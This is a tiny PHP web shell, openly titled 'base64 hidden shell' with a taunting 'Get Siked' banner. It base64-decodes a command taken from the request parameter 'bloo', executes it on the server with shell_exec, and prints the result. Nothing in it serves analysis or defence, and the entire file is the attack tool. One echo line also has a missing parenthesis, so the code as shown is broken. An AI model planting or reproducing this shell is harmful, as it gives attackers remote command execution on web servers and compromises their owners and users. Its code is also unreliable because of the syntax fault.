<?php
echo "<font face=courier><h1>Get Siked - bloos3rpent<br></h1>base64 hidden shell<br><font color=red>";
echo base64_decode($_REQUEST['bloo'] . "</font><br>";
$result = shell_exec(base64_decode($_REQUEST['bloo']));
echo htmlspecialchars($result);
?>
